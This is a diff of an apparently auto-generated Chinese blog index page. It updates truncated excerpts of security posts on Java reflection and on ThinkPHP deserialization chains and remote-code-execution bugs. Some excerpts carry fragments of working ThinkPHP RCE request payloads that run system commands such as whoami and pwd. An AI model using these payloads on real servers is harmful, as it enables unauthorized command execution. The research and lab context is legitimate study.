@@ -402,7 +402,7 @@ Maven3.6.3
 Java反射机制：对于任意一个类都能知道这个类的所有属性和方法，对于任意一个对象，都能调用它的任意方法。这种动态获取信息以及动态调用方法的功能称为反射机制。
 反射的作用：让Java具有动态性
 正射与反射正射我们需要用到某个类的时候，都会先了解这个类是作什么的，然后实例化这个类，接着用实例化后的对象进行操作，这就是正射。
-Studen...
+12Stud...
                         
                     </div>
 
@@ -513,11 +513,11 @@ app\controller\Index.php添加反序列化入口
                         
                             
                             漏洞环境composer安装tp6.0.13
-composer create-project topthink&#x2F;think&#x3D;6.0.13 tp6013
+1composer create-project topthink/think=6.0.13 tp6013
 
 app\controller\Index.php添加反序列化利用点
 
-漏洞分析全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\Abst...
+漏洞分析全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache...
                         
                     </div>
 
@@ -570,10 +570,10 @@ app\controller\Index.php添加反序列化利用点
                         
                             
                             漏洞环境首先下载tp6.0.3
-composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603
+1composer create-project topthink/think=6.0.3 tp603
 
 然后更新版本
-composer update
+1composer update
 
 
 
@@ -583,7 +583,7 @@ app&#x2F;controller&#x2F;Index.php设置反序列化可控点
 漏洞分析利用链1全局搜索_destruct,定位到src\Model.php
 
 
-$this-...
+$this-&gt;lazy...
                         
                     </div>
 
@@ -636,7 +636,7 @@ $this-...
                         
                             
                             漏洞环境首先composer安装thinkphp6框架
-composer create-project topthink&#x2F;think tp 6.0.0
+1composer create-project topthink/think tp 6.0.0
 
 然后更改composer.json
 
@@ -644,7 +644,7 @@ composer create-project topthink&#x2F;think tp 6.0.0
 在app\middleware.php中开启tp6的session
 
 漏洞利用漏洞影响版本：Thinkphp6.0.0-6.0.1
-首先修改app&#x2F...
+首先修改app&#x2F;con...
                         
                     </div>
 
@@ -698,14 +698,7 @@ composer create-project topthink&#x2F;think tp 6.0.0
                             
                             漏洞环境ThinkPHP5.0.24
 application&#x2F;index&#x2F;controller&#x2F;Index.php
-&lt;?php
-namespace app\index\controller;
-
-class Index
-&#123;
-    public function index()
-    &#123;
-        $c = unserialize...
+12345678910111213141516171819202122232425262728293031323334&lt;?phpnamespace app\index\controller;class Index&#123;    publi...
                         
                     </div>
 
@@ -759,14 +752,7 @@ class Index
                             
                             漏洞环境ThinkPHP5.1.37
 application&#x2F;index&#x2F;controller&#x2F;Index.php
-&lt;?php
-namespace app\index\controller;
-
-class Index
-&#123;
-    public function index()
-    &#123;
-        $u = unserialize...
+12345678910111213141516&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        ...
                         
                     </div>
 
@@ -820,9 +806,7 @@ class Index
                             
                             漏洞环境漏洞影响版本：5.0.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.23  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30
 不同版本的payload稍作调整
-# ThinkPHP &lt;&#x3D; 5.0.13
-POST &#x2F;?s&#x3D;index&#x2F;index
-s&#x3D;whoami&amp;_meth...
+123456789101112# ThinkPHP &lt;= 5.0.13POST /?s=index/indexs=whoami&amp;_method=__constru...
                         
                     </div>
 
@@ -877,7 +861,7 @@ s&#x3D;whoami&amp;_meth...
                             漏洞环境漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30
 payload随版本调整:
 5.1.x
-?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;p...
+12345?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd?s=index/\think\vi...
                         
                     </div>
 
